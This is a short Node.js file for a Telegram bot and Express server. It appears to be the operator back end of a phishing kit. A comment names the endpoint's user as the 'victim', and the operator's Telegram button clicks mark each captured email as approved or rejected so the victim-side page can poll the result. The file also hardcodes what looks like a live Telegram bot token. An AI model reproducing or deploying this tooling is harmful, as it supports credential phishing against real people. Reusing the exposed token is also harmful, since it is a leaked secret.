const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();
const token = '8251315315:AAEU1s7Xrhwv7dQG8qP9he8pxbYBRs2eEcU';
const bot = new TelegramBot(token, { polling: true });

// Store approval status
const approvals = {};

// API endpoint for victim to check approval status
app.get('/api/approval', (req, res) => {
  const email = req.query.email;
  const status = approvals[email] || 'pending';
  res.json({ status });
});

app.listen(3000, () => console.log('Bot API running on port 3000'));

// Handle inline button clicks
bot.on('callback_query', (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const email = data.split('_')[1];

  if (data.startsWith('approve')) {
    approvals[email] = 'approved';
    bot.sendMessage(chatId, `✅ Approved: ${email}`);
    bot.answerCallbackQuery(query.id, { text: '✅ Approved!' });
  } else if (data.startsWith('reject')) {
    approvals[email] = 'rejected';
    bot.sendMessage(chatId, `❌ Rejected: ${email}`);
    bot.answerCallbackQuery(query.id, { text: '❌ Rejected!' });
  }
});
